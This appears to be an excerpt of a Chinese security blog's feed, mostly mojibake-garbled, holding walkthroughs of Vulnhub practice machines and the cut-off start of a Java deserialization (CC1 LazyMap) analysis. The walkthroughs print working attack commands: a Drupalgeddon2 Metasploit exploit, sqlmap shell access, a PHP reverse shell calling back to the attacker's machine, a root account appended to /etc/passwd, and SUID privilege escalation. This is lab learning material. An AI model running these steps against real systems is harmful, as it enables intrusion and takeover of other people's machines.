alt="image-20230503133247513"><br>åˆ©ç”¨æ’ä»¶çœ‹ä¸€ä¸‹æŒ‡çº¹ä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ°Drupalç‰ˆæœ¬ä¸º7æ˜¯å­˜åœ¨è¿™ä¸ªCVEæ¼æ´çš„<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031332162.png" alt="image-20230503133258116"></p><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>ç›´æ¥åˆ©ç”¨msfconsoleæ¥çœ‹ä¸€ä¸‹ï¼Œè¿™é‡Œæ‰‹åŠ¨å¼„çš„è¯å¾ˆéº»çƒ¦ï¼Œè¿›å…¥msfæœä¸€ä¸‹è¿™ä¸ªæ¨¡å—<br><code>search Drupal</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031333978.png" alt="image-20230503133311896"><br>ç›´æ¥ä½¿ç”¨18å¹´çš„é‚£ä¸ªCVE<code>use exploit/unix/webapp/drupal_drupalgeddon2</code>ç„¶åæŸ¥çœ‹ä¸€ä¸‹payloadæ‰§è¡Œ<code>show payloads</code>å¯ä»¥çœ‹åˆ°æ‰€æœ‰payloadåˆ—å‡ºï¼Œä½¿ç”¨å¦‚ä¸‹payloadï¼Œè¿™é‡Œä¹Ÿå¯ä»¥ä¸è®¾ç½®ï¼Œæˆ‘æ˜¯ä¸ºäº†ç»ƒä¹ ä¸€ä¸‹å·¥å…·ä½¿ç”¨<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031333921.png" alt="image-20230503133321883"><br><code>set payload php/meterpreter/reverse_tcp</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031333997.png" alt="image-20230503133330955"><br>ç„¶åæŸ¥çœ‹éœ€è¦é…ç½®çš„å‚æ•°<br><code>show options</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031333547.png" alt="image-20230503133344476"><br>yesä¸ºå¿…å¡«å‚æ•°ï¼Œæœ‰é»˜è®¤çš„ç›´æ¥ç”¨ï¼Œè¿™é‡Œå°±åªéœ€è¦é…ä¸€ä¸‹RHOSTSå³é¶æœºIP<br><code>set rhosts 192.168.75.133</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031334617.png" alt="image-20230503133401577"><br>ç„¶åå¼€å§‹æ”»å‡»<code>exploit</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031334085.png" alt="image-20230503133412030"><br>æ”»å‡»æˆåŠŸï¼Œæ‹¿shell<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031334632.png" alt="image-20230503133423597"><br>lsçœ‹åˆ°flag1å…ˆæ‰“å¼€çœ‹çœ‹<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031334177.png" alt="image-20230503133433140"></p><h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>ç”¨pythonè·å–äº¤äº’å¼shell<br><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031334420.png" alt="image-20230503133444394"><br>çœ‹ä¸€ä¸‹ç”¨æˆ·æƒé™ï¼Œåªæ˜¯ä¸€ä¸ªæ™®é€šç”¨æˆ·<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031334760.png" alt="image-20230503133458731"><br>æ ¹æ®flag1æç¤ºçœ‹ä¸€ä¸‹é…ç½®æ–‡ä»¶ï¼Œé€šè¿‡ç™¾åº¦å¾—åˆ°é…ç½®æ–‡ä»¶åsettings.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat `find / -name settings.php`</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¹Ÿå¯ä»¥ä½¿ç”¨å‘½ä»¤<code>find . -name &quot;set*&quot;</code>æœåˆ°é…ç½®æ–‡ä»¶<br>æ‹¿åˆ°flag2å’Œä¸€ä¸ªæ•°æ®åº“<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031335864.png" alt="image-20230503133518795"></p><h2 id="flag3ï¼Œæ‹¿ä¸‹æ•°æ®åº“"><a href="#flag3ï¼Œæ‹¿ä¸‹æ•°æ®åº“" class="headerlink" title="flag3ï¼Œæ‹¿ä¸‹æ•°æ®åº“"></a>flag3ï¼Œæ‹¿ä¸‹æ•°æ®åº“</h2><p>ç™»å…¥æ•°æ®åº“<br><code>mysql -udbuser -pR0ck3t</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031335424.png" alt="image-20230503133539364"><br>ç„¶åå°±æ˜¯æŸ¥çœ‹ä¸€ä¸‹æ•°æ®åº“é‡Œé¢çš„ä¸œè¥¿<br><code>show databases;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031335139.png" alt="image-20230503133553088"><br><code>use drupaldb;show tables;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031336614.png" alt="image-20230503133605586"><br>æŸ¥çœ‹è¿™ä¸ªusersè¡¨<br><code>select * from users\G;</code><br>è¿™é‡Œ<code>\G</code>å°±æ˜¯çºµå‘æ˜¾ç¤ºæ•°æ®<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031336167.png" alt="image-20230503133616089"><br>å¾—åˆ°ä¸¤ä¸ªç”¨æˆ·ï¼Œä¸è¿‡å¯†ç ä¸æ˜¯æ˜æ–‡ï¼Œæ¨¡ç³Šæœç´¢ä¸€ä¸‹çœ‹çœ‹æœ‰æ²¡æœ‰åŠ å¯†è„šæœ¬<br><code>find . -name &quot;*hash*&quot;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031336085.png" alt="image-20230503133629051"><br>æ‰¾åˆ°åŠ å¯†è„šæœ¬ï¼Œç®€å•è¿è¡Œä¸€ä¸‹çœ‹çœ‹<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031336935.png" alt="image-20230503133639889"><br>è¿™é‡Œåº”è¯¥å°±æ˜¯ç›´æ¥åœ¨åé¢åŠ ä¸Šå¯†ç å°±å¯ä»¥å¾—åˆ°å¯†æ–‡ï¼Œåæ­£å°±æ˜¯å¤šå°è¯•<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031336174.png" alt="image-20230503133652131"><br>è¿™é‡Œæˆ‘ä»¬æƒ³è¯•å‡ºadminçš„å¯†ç å¾ˆéš¾ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±ç›´æ¥åœ¨æ•°æ®åº“é‡Œé¢è¿›è¡Œæ›¿æ¢</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> users <span class="keyword">set</span> pass<span class="operator">=</span><span class="string">&#x27;$S$DQg60FlJLrmVGTkV6v6xnQKJGLPv9Bq5mNizW6/kv0IeIyA.2dyd&#x27;</span> <span class="keyword">where</span> name<span class="operator">=</span>&quot;admin&quot;;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031337238.png" alt="image-20230503133707194"><br>æ›¿æ¢æˆåŠŸï¼Œç„¶åç™»å½•çœ‹çœ‹<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031337851.png" alt="image-20230503133717797"><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031337379.png" alt="image-20230503133727343"><br>åœ¨è¿™é‡Œæ‰¾åˆ°flag3</p><h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>æ ¹æ®flag3æç¤ºï¼Œæ‰“å¼€&#x2F;etc&#x2F;passwdçœ‹çœ‹<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031337479.png" alt="image-20230503133743399"><br>å¾—åˆ°flag4ç”¨æˆ·ï¼Œå¹¶ä¸”åœ¨ç”¨æˆ·ç›®å½•ä¸‹å¯ä»¥æ‰¾åˆ°flag4ï¼Œè¿™é‡Œä¹Ÿå¯ä»¥ä½¿ç”¨å·¥å…·Hydraå»çˆ†ç ´ç”¨æˆ·sshå¯†ç è¿œç¨‹ç™»å½•<br><code>hydra -l flag4 -P /usr/share/wordlists/rockyou.txt.gz ssh://192.168.75.133</code><br>ä½†æ˜¯æ—¢ç„¶èƒ½ç›´æ¥æ‰“å¼€æ²¡å¿…è¦å»çˆ†ç ´<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031337304.png" alt="image-20230503133756258"><br>æç¤ºrootç›®å½•ä½†æ˜¯æ²¡æœ‰æƒé™æ‰“å¼€ï¼Œå¼€å§‹ææƒ</p><h2 id="flag5ï¼Œsuidææƒ"><a href="#flag5ï¼Œsuidææƒ" class="headerlink" title="flag5ï¼Œsuidææƒ"></a>flag5ï¼Œsuidææƒ</h2><p>åˆ©ç”¨findå‘½ä»¤ï¼Œæ‰¾æŸ¥å…·æœ‰SUIDæƒé™çš„å¯æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">find æŒ‡ä»¤  </span><br><span class="line">/ æ ¹ç›®å½•(æŸ¥æ‰¾ä½ç½®)  </span><br><span class="line">-perm æƒé™  </span><br><span class="line">-u ç”¨æˆ·(s=ç‰¹æƒ)  </span><br><span class="line">-type ç±»å‹  </span><br><span class="line">f æ–‡ä»¶  </span><br><span class="line">2&gt;/dev/nul è¿‡æ»¤é”™è¯¯ä¿¡æ¯(ä¸æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031338317.png" alt="image-20230503133811249"><br>findå‘½ä»¤åœ¨é‡Œé¢å¯ä»¥ç›´æ¥ä½¿ç”¨å®ƒæ¥ææƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find / -name index.php -exec &quot;/bin/sh&quot; \;</span><br><span class="line"></span><br><span class="line">æ‰¾æŸ¥ä»€ä¹ˆæ–‡ä»¶ä¸é‡è¦ï¼ˆä½†æ˜¯æ˜¯å­˜åœ¨çš„æ–‡ä»¶ï¼‰ï¼Œåªéœ€è¦æ ¼å¼å¯¹ï¼Œç„¶ååé¢åŠ ä¸Š</span><br><span class="line">-exec &quot;/bin/sh&quot; \;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031338793.png" alt="image-20230503133821756"><br>ææƒæˆåŠŸï¼Œç„¶åè¿›å…¥rootç›®å½•æŸ¥çœ‹<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031338643.png" alt="image-20230503133830589"><br>æ‰¾åˆ°æœ€åä¸€ä¸ªflagï¼Œæ‰“é¶ç»“æŸ</p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub--Ai-Web1</title>
      <link href="/undefined/59799.html"/>
      <url>/undefined/59799.html</url>
      
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h2><p>ç›´æ¥ä¸‹è½½é¶æœºç„¶åè§£å‹ï¼ŒVMwareä¸Šè¿è¡Œvmxæ–‡ä»¶å°±è¡Œï¼Œ<a href="https://www.vulnhub.com/entry/ai-web-1,353/">é¶æœºé“¾æ¥</a><br>è¿è¡Œé¶æœºä¼šæœ‰è¦å¯†ç ç™»å½•ï¼Œåˆ«ç®¡å°±è¡Œï¼Œå› ä¸ºæ¸—é€å·²ç»å¼€å§‹äº†ï¼ï¼</p><h2 id="å¼€å§‹æ‰“é¶"><a href="#å¼€å§‹æ‰“é¶" class="headerlink" title="å¼€å§‹æ‰“é¶"></a>å¼€å§‹æ‰“é¶</h2><p>ä½¿ç”¨netdiscoveræ‰«æip<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012014759.png" alt="image-20230501201446634"><br>æŒ¨ä¸ªè®¿é—®ï¼Œæœ€ç»ˆå‘ç°192.168.75.132è¿™ä¸ªIPå¯ç–‘<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012015300.png" alt="image-20230501201508266"><br>nmapæ‰«æä¸€ä¸‹è¿™ä¸ªIP æŸ¥çœ‹å¼€æ”¾ç«¯å£</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sV -O -A -P 192.168.75.132</span><br><span class="line">-T4(é€Ÿåº¦) -sV(ç‰ˆæœ¬æ‰«æå’Œå¼€å¯çš„æœåŠ¡) -O(æ“ä½œç³»ç»Ÿ) -p-ï¼ˆå…¨éƒ¨ç«¯å£</span><br><span class="line">è¿™é‡Œå…¶å®ç”¨-Aå°±å¯ä»¥ï¼Œä¸»è¦æ—¶ç†Ÿæ‚‰ä¸€ä¸‹å‚æ•°</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012015178.png" alt="image-20230501201519095"><br>å¯ä»¥çœ‹åˆ°80ç«¯å£å¼€æ”¾ä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸€å¼€å§‹è®¿é—®çš„é‚£ä¸ªé¡µé¢ï¼Œç›´æ¥æ‰«ä¸€ä¸‹ç›®å½•<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012015905.png" alt="image-20230501201529877"><br>å­˜åœ¨ä¸€ä¸ªrobots.txt<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012015947.png" alt="image-20230501201540911"><br>emmmmï¼Œä¸¤ä¸ªéƒ½æ˜¯403ï¼Œç„¶åå¯¹ç€è¿™ä¸ªä¸¤ä¸ªè·¯å¾„æ‰«ä¸€ä¸‹ï¼Œæ‰«åˆ°ä¸€ä¸ª<code>http://192.168.75.132/m3diNf0/info.php</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012015714.png" alt="image-20230501201552683"><br>ç½‘ç«™çš„ç»å¯¹è·¯å¾„ï¼Œç„¶åæ‰«å¦ä¸€ä¸ª<code>http://192.168.75.132/se3reTdir777</code>è¿™é‡Œä¸€å¼€å§‹æ‰«çš„uploadsä½†æ˜¯æ²¡æœ‰ä¸œè¥¿ç„¶åå°±æ‰«äº†è¿™ä¸ªï¼Œçœ‹wpæœ‰çš„æ˜¯ç”¨çš„kaliä¸‹çš„dirbï¼Œæ¶¨å§¿åŠ¿äº†ä»¥å‰éƒ½ä¸çŸ¥é“è¿™ä¸ªå·¥å…·<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012016438.png" alt="image-20230501201605406"><br>è®¿é—®index.phpï¼Œä¸­é€”æ–­å¼€è¿æ¥äº†è¿˜ä»¥ä¸ºæ˜¯é¢˜ç›®çš„è®¾å®šã€‚ã€‚ã€‚è®¿é—®å¾—åˆ°ä¸‹é¢çš„è¡¨å•<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012016204.png" alt="image-20230501201615163"></p><h2 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h2><p>ä½¿ç”¨<code>1&#39;</code>æ¢æµ‹æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥ï¼Œå‘ç°æŠ¥é”™<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012016498.png" alt="image-20230501201626465"><br>ç„¶åä½¿ç”¨<code>1&#39;#</code>æ­£å¸¸sqlæ³¨å…¥æ²¡è·‘äº†<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012016645.png" alt="image-20230501201634617"><br>æŠ“ä¸ªåŒ…å¾—åˆ°å‚æ•°ï¼Œå› ä¸ºæ˜¯postæ³¨å…¥ç›´æ¥ä¿å­˜ä¸€ä¸‹è¿™ä¸ªåŒ…ç„¶åä¸¢sqlmapå…ˆè·‘ä¸€ä¸‹ï¼Œæ¯•ç«Ÿä¸æ˜¯ctfé¢˜åº”è¯¥èƒ½è·‘å‡ºæ¥<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012016931.png" alt="image-20230501201645892"><br><code>python sqlmap.py -r &quot;E:\vuluhubé¶åœº\AI Web 1.0\åšé¢˜\1.txt&quot; -p uid --dbs</code>æ‰§è¡Œå‘½ä»¤ç›´æ¥è·‘ï¼Œè·‘çš„æ—¶å€™æ‰‹å·¥æµ‹äº†ä¸€ä¸‹å‘ç°unionæ²¡æ³•æ³¨å› ä¸ºæ²¡æœ‰å›æ˜¾ï¼Œç„¶åå‘ç°å­˜åœ¨å»¶æ—¶æ³¨å…¥ï¼Œæœç„¶sqlmapä¸€å¼€å§‹æ²¡æ³¨å‡ºæ¥<br><code>python sqlmap.py -r &quot;E:\vuluhubé¶åœº\AI Web 1.0\åšé¢˜\1.txt&quot; -p uid --technique=T --dbs</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sqlmapæŒ‡å®šæ³¨å…¥ç±»å‹</span><br><span class="line">--technique=T</span><br><span class="line">B:å¸ƒå°”ç›²æ³¨</span><br><span class="line">E:æŠ¥é”™æ³¨å…¥</span><br><span class="line">U:è”åˆæŸ¥è¯¢æ³¨å…¥</span><br><span class="line">S:æ–‡ä»¶ç³»ç»Ÿ,æ“ä½œç³»ç»Ÿ,æ³¨å†Œè¡¨ç›¸å…³</span><br><span class="line">T:æ—¶é—´ç›²æ³¨</span><br></pre></td></tr></table></figure><p>è¿™ä¸¤ç§æ–¹å¼éƒ½æ²¡æ³¨å‡ºæ¥ã€‚ã€‚ã€‚çœ‹çœ‹wpæ€ä¹ˆæ³¨çš„å§<br><code>sqlmap -u &quot;http://192.168.75.132/se3reTdir777/index.php#&quot; --data &quot;uid=1&amp;Operation=Submit&quot;  --dbs</code><br>å¥½å§ï¼Œç›´æ¥æŒ‡å®šå‚æ•°æ³¨<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012017136.png" alt="image-20230501201714088"><br>emmmï¼Œkaliä¸‹çš„sqlmapè¿™ä¹ˆå¿«çš„å—ï¼Œä¸€ç›´ç”¨çš„Windowsä¸‹çš„ï¼Œçœ‹çœ‹aiweb1<br><code>sqlmap -u &quot;http://192.168.75.132/se3reTdir777/index.php#&quot; --data &quot;uid=1&amp;Operation=Submit&quot;  --tables -D aiweb1</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012017717.png" alt="image-20230501201722682"><br>çœ‹å­—æ®µ<br><code>sqlmap -u &quot;http://192.168.75.132/se3reTdir777/index.php#&quot; --data &quot;uid=1&amp;Operation=Submit&quot;  --columns -D aiweb1 -T user</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012017314.png" alt="image-20230501201733277"><br>æ²¡å•¥ä¸œè¥¿ï¼Œç›´æ¥æ‹¿shellå§<br><code>sqlmap -u &quot;http://192.168.75.132/se3reTdir777/index.php#&quot; --data &quot;uid=1&amp;Operation=Submit&quot;  --os-shell</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012017902.png" alt="image-20230501201755826"><br>ä¸‹é¢çš„2ä¸ºè‡ªå®šä¹‰ä¸Šä¼ è·¯å¾„ç»“åˆæˆ‘ä»¬åˆšåˆšå¾—åˆ°çš„ç»å¯¹è·¯å¾„å°±èƒ½çŸ¥é“é©¬çš„ä½ç½®ï¼Œé€šè¿‡ä¸‹é¢çš„æ“ä½œèƒ½çŸ¥é“æƒé™ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆwhoamiå‘½ä»¤æ²¡æœ‰è¾“å‡ºï¼Œéš¾é“æ²¡æœ‰ï¼Ÿï¼Ÿ<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012018282.png" alt="image-20230501201810247"><br>çŸ¥é“ç»å¯¹è·¯å¾„é‚£å°±å†™ä¸ªä¸€å¥è¯æœ¨é©¬è¿›å…¥ï¼Œsqlmapçš„é©¬èšå‰‘è¿ä¸ä¸Š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.132/se3reTdir777&quot; --data &quot;uid=1&amp;Operation=Submit&quot; --file-write ./2.php --file-dest /home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/2.php</span><br><span class="line"></span><br><span class="line">--file-write:å»è¯»å–æ–‡ä»¶(1.php)</span><br><span class="line">--file-dest:åé¢åŠ ç›®æ ‡çš„ç»å¯¹è·¯å¾„ å·²ç»ç”Ÿæˆæœ¨é©¬çš„åç§°ï¼ˆ1.phpï¼‰</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸€æ ·çš„å‘½ä»¤wpèƒ½ä¸Šä¼ ä¸Šå»æˆ‘ä¸è¡Œï¼Œæ—¢ç„¶ä¸€å¥è¯ä¼ ä¸ä¸Šå»é‚£å°±ç›´æ¥å°è¯•åå¼¹shell</p><h2 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h2><p>å‡†å¤‡ä¸€ä¸ªåå¼¹shellçš„phpæ–‡ä»¶,ï¼ŒIPä¸ºkali IP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sock</span>=<span class="title function_ invoke__">fsockopen</span>(<span class="string">&quot;192.168.75.128&quot;</span>,<span class="number">6666</span>);</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ©ç”¨pythonæ­å»ºä¸€ä¸ªç®€æ˜“çš„webæœåŠ¡ï¼Œè¿™é‡Œpythonå†…ç½®äº†æ¨¡å—åªéœ€è¦æ‰§è¡Œå‘½ä»¤å°±è¡Œï¼Œä¸‹é¢ä¸ºpython3ç¯å¢ƒ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server <span class="number">9999</span></span><br><span class="line"><span class="comment">#9999ä¸ºç«¯å£å·ï¼Œå¯è‡ªå·±æŒ‡å®š</span></span><br></pre></td></tr></table></figure><p>ç„¶åå°±ä¼šåœ¨é¡µé¢æ˜¾ç¤ºå½“å‰ç›®å½•çš„æ–‡ä»¶ï¼Œå¦‚æœæœ‰é»˜è®¤çš„index.htmlæ–‡ä»¶å°±ä¼šä¼˜å…ˆæ˜¾ç¤ºï¼Œè¿™é‡Œåˆæœ‰ä¸ªå‘å°±æ˜¯æˆ‘æ–‡ä»¶æ”¾åœ¨æ¡Œé¢å®ƒä¸æ˜¾ç¤ºï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆ<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012018642.png" alt="image-20230501201822611"><br>ç„¶ååœ¨é¶æœºä¸Šä½¿ç”¨wgetä¸‹è½½shellæ–‡ä»¶<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012018555.png" alt="image-20230501201833498"><br>å»ºç«‹ç›‘å¬ï¼Œç„¶ååœ¨é¶æœºä¸Šè¿è¡Œshell.php<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012018907.png" alt="image-20230501201842818"><br>è¿™é‡Œä¸€æ¬¡æ²¡æˆåŠŸå¤šè¯•å‡ ä¸‹å°±è¡Œï¼ŒæŸ¥çœ‹æƒé™ä¸ºwww-dataï¼Œä¸‹é¢å¼€å§‹ææƒ</p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>æ‰§è¡Œå‘½ä»¤<code>ls -l /etc/passwd</code>å¯ä»¥çœ‹åˆ°å½“å‰ç”¨æˆ·å¯¹etc&#x2F;passwdæ–‡ä»¶å…·æœ‰rw(è¯»å†™)æƒé™<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012019372.png" alt="image-20230501201935342"><br>å†™å…¥çš„æ—¶å€™å¯†ç æ˜¯åŠ å¯†çš„ï¼Œæ‰€ä»¥è¦å…ˆåŠ å¯†å¯†ç ï¼š<br><code> openssl passwd -1 -salt web1 123456</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012019455.png" alt="image-20230501201943426"><br>ç„¶åå†™å…¥å¯†ç <br><code>echo &#39;web1:$1$web1$ZrYgDZgZpLlsnVlxUaZwh/:0:0::/root:/bin/bash&#39; &gt;&gt;/etc/passwd</code><br>ç›´æ¥åˆ‡æ¢ç”¨æˆ·ä¼šæŠ¥é”™<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012021388.png" alt="image-20230501202106358"><br>è½¬æ¢ä¸ºäº¤äº’å¼shell<br><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012021499.png" alt="image-20230501202135452"><br>å¯ä»¥çœ‹åˆ°æƒé™å·²ç»æ˜¯rootäº†ï¼Œflagåœ¨rootç›®å½•ä¸‹<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012021654.png" alt="image-20230501202154593"><br>ç¬¬ä¸€æ¬¡åšè¿™ç§é¶åœºè¿˜æŒºæœ‰æ„æ€</p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CCé“¾1--LazyMapé“¾</title>
      <link href="/undefined/36068.html"/>
      <url>/undefined/36068.html</url>
      
        <content type="html"><![CDATA[<h2 id="å¼€å§‹åˆ†æ"><a href="#å¼€å§‹åˆ†æ" class="headerlink" title="å¼€å§‹åˆ†æ"></a>å¼€å§‹åˆ†æ</h2><p>è¿™é‡Œæˆ‘ç›´æ¥æ‹¿cc1çš„demoæ”¹äº†ï¼Œé¦–å…ˆè¿›å…¥<code>InvokerTransformer</code>ä¸‹çš„<code>transform</code>æ–¹æ³•ç„¶åfind usages<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304301819199.png" alt="image-20230430181911069"><br>å¯ä»¥çœ‹åˆ°LazyMapä¸‹ä¹Ÿè°ƒç”¨äº†<code>transform</code>æ–¹æ³•ï¼Œç›´æ¥è¿›å»çœ‹ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;  </span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map  </span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);  </span><br><span class="line">        map.put(key, value);  </span><br><span class="line">        <span class="keyword">return</span> value;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>publicå‹<code>get</code>æ–¹æ³•è°ƒç”¨äº†<code>transform</code>æ–¹æ³•ï¼Œç„¶åå»çœ‹factory<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304301819343.png" alt="image-20230430181932250"><br>ç„¶åè¿™é‡ŒåŒæ—¶è¿˜æœ‰decorateæ–¹æ³•å’Œ<code>TransformMap</code> ä¸­çš„ <code>decorate</code> æ–¹æ³•æ˜¯ä¸€æ ·çš„ä½œç”¨ï¼Œç„¶åå»çœ‹è¿™ä¸ªç±»çš„æ„é€ å‡½æ•°ä¸º<code>protected</code>æ‰€ä»¥å¾—é€šè¿‡decorateæ–¹æ³•è·å¾—LazyMapç±»çš„å¯¹è±¡å»è°ƒç”¨<br>å…ˆå†™ä¸ªexpå¼¹è®¡ç®—å™¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 